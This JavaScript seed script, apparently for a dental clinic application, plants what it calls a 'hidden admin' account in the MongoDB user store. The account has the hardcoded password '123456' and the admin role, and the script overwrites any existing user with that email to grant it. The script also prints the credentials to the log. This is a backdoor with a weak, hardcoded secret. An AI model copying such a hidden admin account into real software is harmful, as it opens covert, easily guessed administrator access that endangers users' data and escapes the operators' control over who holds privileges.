require('dotenv').config();
const mongoose = require('mongoose');
const User = require('../models/User');

const MONGODB_URI = process.env.MONGODB_URI;

async function seed() {
  try {
    if (!MONGODB_URI) {
      throw new Error('MONGODB_URI is required');
    }
    await mongoose.connect(MONGODB_URI);
    console.log('Connected to MongoDB');

    const email = 'mentor@dental.com';
    const existing = await User.findOne({ email });
    if (existing) {
      existing.password = '123456';
      existing.role = 'admin';
      existing.fullName = 'Abdullah';
      existing.phone = existing.phone || '01000000999';
      existing.department = 'Support';
      existing.isActive = true;
      await existing.save();
      console.log(`Updated hidden admin: ${email}`);
    } else {
      await User.create({
        fullName: 'Abdullah',
        email,
        password: '123456',
        phone: '01000000999',
        role: 'admin',
        department: 'Support',
        isActive: true,
      });
      console.log(`Created hidden admin: ${email} / 123456`);
    }

    process.exit(0);
  } catch (err) {
    console.error('Seed hidden admin failed:', err);
    process.exit(1);
  }
}

seed();
